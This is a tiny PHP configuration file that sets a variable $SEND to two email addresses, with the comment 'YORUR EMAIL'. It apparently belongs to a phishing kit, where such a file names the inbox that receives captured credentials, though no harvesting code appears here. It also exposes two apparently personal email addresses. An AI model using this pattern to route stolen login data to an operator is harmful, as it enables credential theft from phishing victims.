<?php

$SEND="mr.popmarley@yandex.com,bigomido2020@gmail.com"; // YORUR EMAIL


?>